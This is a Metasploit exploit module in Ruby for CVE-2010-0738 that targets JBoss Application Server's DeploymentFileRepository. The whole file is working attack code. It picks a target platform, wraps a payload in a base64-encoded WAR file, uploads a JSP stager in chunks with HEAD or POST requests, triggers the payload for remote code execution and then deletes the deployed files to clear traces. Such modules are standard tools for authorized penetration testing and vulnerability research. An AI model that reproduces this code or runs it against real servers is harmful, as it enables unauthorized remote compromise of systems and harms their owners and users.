##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }

  include Msf::Exploit::Remote::HTTP::JBoss

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'JBoss Java Class DeploymentFileRepository WAR Deployment',
      'Description' => %q{
          This module uses the DeploymentFileRepository class in
        JBoss Application Server (jbossas) to deploy a JSP file
        which then deploys the WAR file.
      },
      'Author'      => [ 'MC', 'Jacob Giannantonio', 'Patrick Hof', 'h0ng10' ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2010-0738' ], # by using VERB other than GET/POST
          [ 'OSVDB', '64171' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
        ],
      'Privileged'  => false,
      'Platform'    => %w{ java linux win },
      'Targets'     =>
        [
          #
          # do target detection but java meter by default
          # detect via /manager/serverinfo
          #
          [ 'Automatic (Java based)',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'java',
            } ],

          #
          # Platform specific targets only
          #
          [ 'Windows Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            },
          ],
          [ 'Linux Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            },
          ],

          #
          # Java version
          #
          [ 'Java Universal',
            {
              'Platform' => 'java',
              'Arch' => ARCH_JAVA,
            }
          ]
        ],

      'DisclosureDate' => "Apr 26 2010",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('JSP',   [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
        OptString.new('APPBASE', [ false, 'Application base name, (default: random)', nil ])
      ], self.class)
  end

  def exploit
    jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))
    app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))
    stager_base = rand_text_alpha(8+rand(8))
    stager_jsp_name  = rand_text_alpha(8+rand(8))

    p = payload
    mytarget = target

    if (http_verb == 'HEAD')
      print_status("Unable to automatically select a target with HEAD requests")
    else
      if (target.name =~ /Automatic/)
        mytarget = auto_target(targets)
        if (not mytarget)
          fail_with(Failure::NoTarget, "Unable to automatically select a target")
        end
        print_status("Automatically selected target \"#{mytarget.name}\"")
      else
        print_status("Using manually select target \"#{mytarget.name}\"")
      end
      arch = mytarget.arch
    end


    # set arch/platform from the target
    plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]

    # We must regenerate the payload in case our auto-magic changed something.
    return if ((p = exploit_regenerate_payload(plat, arch)) == nil)

    # Generate the WAR containing the payload
    war_data = p.encoded_war({
      :app_name => app_base,
      :jsp_name => jsp_name,
      :arch => mytarget.arch,
      :platform => mytarget.platform
    }).to_s

    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
    stager_contents = stager_jsp_with_payload(app_base, encoded_payload)
    # Depending on the type on the verb we might use a second stager
    if http_verb == "POST" then
      print_status("Deploying stager for the WAR file")
      res = upload_file(stager_base, stager_jsp_name, stager_contents)
    else
      print_status("Deploying minimal stager to upload the payload")
      head_stager_jsp_name = rand_text_alpha(8+rand(8))
      head_stager_contents = head_stager_jsp(stager_base, stager_jsp_name)
      head_stager_uri = "/" + stager_base + "/" + head_stager_jsp_name + ".jsp"
      res = upload_file(stager_base, head_stager_jsp_name, head_stager_contents)

      # We split the stager_jsp_code in multipe junks and transfer on the
      # target with multiple requests
      current_pos = 0
      while current_pos < stager_contents.length
        next_pos = current_pos + 5000 + rand(100)
        vars_get = { "arg0" => stager_contents[current_pos,next_pos] }
        print_status("Uploading second stager (#{current_pos}/#{stager_contents.length})")
        res = deploy('uri' => head_stager_uri,
                     'vars_get' => vars_get)
        current_pos += next_pos
      end
    end

    # Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
    # but the file still gets written.
    unless res && ( res.code == 200 || res.code == 500)
      fail_with(Failure::Unknown, "Failed to deploy")
    end

    print_status("Calling stager to deploy the payload warfile (might take some time)")
    stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
    stager_res = deploy('uri' => stager_uri,
                        'method' => 'GET')

    print_status("Try to call the deployed payload")
    # Try to execute the payload by calling the deployed WAR file
    payload_uri = "/" + app_base + "/" + jsp_name + '.jsp'
    payload_res = deploy('uri' => payload_uri)

    #
    # DELETE
    #
    # The WAR can only be removed by physically deleting it, otherwise it
    # will get redeployed after a server restart.
    print_status("Undeploying stager and payload WARs via DeploymentFileRepository.remove()...")
    print_status("This might take some time, be patient...") if http_verb == "HEAD"
    delete_res = []
    if head_stager_jsp_name
      delete_res << delete_file(stager_base + '.war', head_stager_jsp_name, '.jsp')
    end
    delete_res << delete_file(stager_base + '.war', stager_jsp_name, '.jsp')
    delete_res << delete_file('./', stager_base + '.war', '')
    delete_res << delete_file('./', app_base + '.war', '')
    delete_res.each do |res|
      if !res
        print_warning("WARNING: Unable to remove WAR [No Response]")
      elsif (res.code < 200 || res.code >= 300)
        print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
      end

      handler
    end
  end
end